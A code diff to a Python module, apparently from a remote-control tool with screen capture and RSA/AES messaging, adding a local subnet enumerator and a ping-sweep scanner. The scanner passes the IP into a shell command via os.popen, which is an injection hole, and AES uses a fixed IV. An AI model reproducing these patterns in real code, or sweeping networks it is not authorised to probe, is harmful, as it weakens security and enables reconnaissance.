@@ -1,13 +1,13 @@
+import random
+import string
 import time
 
-from PIL import ImageGrab
-from Cryptodome.PublicKey import RSA
-from Cryptodome.Cipher import PKCS1_OAEP
 from Cryptodome.Cipher import AES
+from Cryptodome.Cipher import PKCS1_OAEP
+from Cryptodome.PublicKey import RSA
 from Cryptodome.Util import Padding
-import string
-import random
-
+from PIL import ImageGrab
+from bin.Client import Client
 IV = b"H" * 16
 
 enc_key = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{['
@@ -136,3 +136,28 @@ def decrypt_client(data, AES_KEY):
     decrypted_padded_message = decryptor.decrypt(data)
     decrypted_message = Padding.unpad(decrypted_padded_message, 16)
     return decrypted_message
+
+
+def check_hosts(subnet_mask: str):
+    from netaddr import IPNetwork
+    import socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip_address = s.getsockname()[0]
+    network = IPNetwork('/'.join([ip_address, subnet_mask]))
+    generator = network.iter_hosts()
+    st = ''
+    for i in list(generator):
+        st += str(i) + '\n'
+    return st
+
+
+def scanner(ip_address, lock, clients):
+    import os
+    result = os.popen('ping {0} -n 1'.format(ip_address)).read()
+    if "TTL" in result:
+        with lock:
+            clients.append(ip_address)
+        print(ip_address)
+
+
